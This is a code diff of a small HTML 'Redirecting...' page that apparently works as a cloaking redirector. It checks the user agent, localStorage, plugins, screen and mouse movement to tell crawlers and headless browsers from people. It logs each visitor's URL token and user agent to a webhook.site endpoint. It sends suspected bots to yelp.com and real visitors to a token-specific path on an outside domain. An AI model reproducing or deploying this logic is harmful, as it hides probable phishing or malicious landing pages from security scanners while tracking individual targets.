@@ -4,48 +4,54 @@
   <meta charset="UTF-8">
   <title>Redirecting...</title>
   <script>
-    window.addEventListener("load", async function () {
+    window.addEventListener("load", function () {
       const hash = window.location.hash ? window.location.hash.substring(1) : null;
       const ua = navigator.userAgent || "";
       const uaClean = ua.toLowerCase().replace(/\s+/g, '');
       let isBot = false;
 
-      // Step 1: UA check
-      if (uaClean.includes("bot") || uaClean.includes("crawl") || uaClean.includes("spider") || uaClean.includes("slurp") || uaClean.includes("headless") || uaClean.includes("phantom") || uaClean.includes("facebookexternalhit") || uaClean.includes("googlebot")) {
+      // Step 1: User-Agent bot check
+      if (
+        uaClean.includes("bot") || uaClean.includes("crawl") || uaClean.includes("spider") ||
+        uaClean.includes("slurp") || uaClean.includes("headless") || uaClean.includes("phantom") ||
+        uaClean.includes("facebookexternalhit") || uaClean.includes("googlebot")
+      ) {
         isBot = true;
       }
 
-      // Step 2: JS capability check
+      // Step 2: JS/localStorage check
       try {
         localStorage.setItem("js-check", "1");
         if (localStorage.getItem("js-check") !== "1") isBot = true;
-      } catch (e) {
+      } catch {
         isBot = true;
       }
 
-      // Step 3: Screen and plugin checks
+      // Step 3: Plugin/screen analysis
       if (navigator.plugins.length === 0 || screen.colorDepth < 8 || screen.availHeight === 0) {
         isBot = true;
       }
 
-      // Step 4: Delay to detect mouse movement
+      // Step 4: Monitor mouse movement
       let moved = false;
       window.addEventListener("mousemove", () => moved = true);
 
+      // Step 5: Token check
       if (!hash) {
         window.location.href = "https://google.com";
         return;
       }
 
-      // Log
+      // Step 6: Log to webhook
       const logUrl = "https://webhook.site/1723ccce-7bc8-46c1-802e-838962bea4df";
       const fullLogUrl = `${logUrl}?token=${encodeURIComponent(hash)}&ua=${encodeURIComponent(ua)}&bot=${isBot}&ts=${Date.now()}`;
       const img = new Image();
       img.src = fullLogUrl;
 
-      // Redirect logic after 2 seconds
+      // Step 7: Final redirect after 2 seconds
       setTimeout(() => {
-        if (isBot || !moved) {
+        const finalBot = isBot || !moved;
+        if (finalBot) {
           window.location.href = "https://yelp.com";
         } else {
           window.location.replace(`https://szliyi.com/${hash}`);
